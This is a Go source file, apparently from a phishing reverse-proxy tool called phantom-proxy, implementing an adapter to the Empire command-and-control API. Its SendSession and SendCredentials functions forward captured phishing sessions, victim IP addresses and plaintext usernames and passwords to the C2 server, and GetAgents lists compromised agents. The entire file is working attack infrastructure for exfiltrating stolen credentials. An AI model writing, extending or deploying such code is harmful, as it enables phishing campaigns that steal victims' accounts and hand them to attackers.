package c2

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"go.uber.org/zap"
)

// EmpireAdapter integrates with Empire C2 REST API
type EmpireAdapter struct {
	config     *EmpireConfig
	httpClient *http.Client
	logger     *zap.Logger
	token      string
}

// EmpireConfig configuration
type EmpireConfig struct {
	Enabled    bool   `yaml:"enabled" mapstructure:"enabled"`
	ServerURL  string `yaml:"server_url" mapstructure:"server_url"`
	Username   string `yaml:"username" mapstructure:"username"`
	Password   string `yaml:"password" mapstructure:"password"`
	Token      string `yaml:"token" mapstructure:"token"`
}

// NewEmpireAdapter creates Empire adapter
func NewEmpireAdapter(cfg *EmpireConfig, logger *zap.Logger) *EmpireAdapter {
	adapter := &EmpireAdapter{
		config: cfg,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
		logger: logger,
	}

	// Auto-login to get token if credentials provided
	if cfg.Username != "" && cfg.Password != "" && cfg.Token == "" {
		adapter.login()
	}

	return adapter
}

// Name returns adapter name
func (a *EmpireAdapter) Name() string { return "empire" }

// login authenticates to Empire API
func (a *EmpireAdapter) login() error {
	payload := map[string]string{
		"username": a.config.Username,
		"password": a.config.Password,
	}

	jsonData, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", a.config.ServerURL+"/token", bytes.NewReader(jsonData))
	req.Header.Set("Content-Type", "application/json")

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("empire login failed: %w", err)
	}
	defer resp.Body.Close()

	var result map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return err
	}

	a.token = result["access_token"]
	if a.token == "" {
		return fmt.Errorf("no token received from Empire")
	}

	a.logger.Info("Empire authentication successful")
	return nil
}

func (a *EmpireAdapter) setAuth(req *http.Request) {
	token := a.config.Token
	if a.token != "" {
		token = a.token
	}
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
}

// IsAvailable checks Empire API
func (a *EmpireAdapter) IsAvailable(ctx context.Context) bool {
	if !a.config.Enabled || a.config.ServerURL == "" {
		return false
	}

	req, _ := http.NewRequestWithContext(ctx, "GET", a.config.ServerURL+"/api/version", nil)
	a.setAuth(req)

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200
}

// SendSession sends session to Empire
func (a *EmpireAdapter) SendSession(ctx context.Context, data *SessionData) error {
	if !a.config.Enabled {
		return nil
	}

	a.logger.Info("Sending session to Empire",
		zap.String("session_id", data.SessionID))

	// Empire API: POST /api/credentials
	body, _ := json.Marshal(map[string]interface{}{
		"session_id": data.SessionID,
		"victim_ip":  data.VictimIP,
		"phishlet":   data.PhishletID,
		"user_agent": data.UserAgent,
		"target_url": data.TargetURL,
		"type":       "phantomproxy_session",
	})

	req, _ := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/credentials", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	a.setAuth(req)

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("empire API error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("empire API error: status %d", resp.StatusCode)
	}

	a.logger.Info("Session sent to Empire successfully")
	return nil
}

// SendCredentials sends credentials to Empire
func (a *EmpireAdapter) SendCredentials(ctx context.Context, creds *database.Credentials, metadata map[string]string) error {
	if !a.config.Enabled {
		return nil
	}

	a.logger.Info("Sending credentials to Empire",
		zap.String("username", creds.Username))

	body, _ := json.Marshal(map[string]interface{}{
		"username": creds.Username,
		"password": creds.Password,
		"type":     "plaintext",
		"origin":   "phantomproxy",
		"metadata": metadata,
	})

	req, _ := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/credentials", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	a.setAuth(req)

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("empire API error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("empire API error: status %d", resp.StatusCode)
	}

	a.logger.Info("Credentials sent to Empire successfully")
	return nil
}

// HealthCheck verifies Empire connection
func (a *EmpireAdapter) HealthCheck(ctx context.Context) error {
	if !a.IsAvailable(ctx) {
		return fmt.Errorf("empire server not available")
	}
	return nil
}

// GetAgents lists active agents
func (a *EmpireAdapter) GetAgents(ctx context.Context) ([]map[string]interface{}, error) {
	if !a.config.Enabled {
		return nil, fmt.Errorf("empire not enabled")
	}

	req, _ := http.NewRequestWithContext(ctx, "GET", a.config.ServerURL+"/api/agents", nil)
	a.setAuth(req)

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}

	agents, ok := result["agents"].([]interface{})
	if !ok {
		return []map[string]interface{}{}, nil
	}

	// Convert to map
	agentList := make([]map[string]interface{}, len(agents))
	for i, agent := range agents {
		if m, ok := agent.(map[string]interface{}); ok {
			agentList[i] = m
		}
	}

	return agentList, nil
}
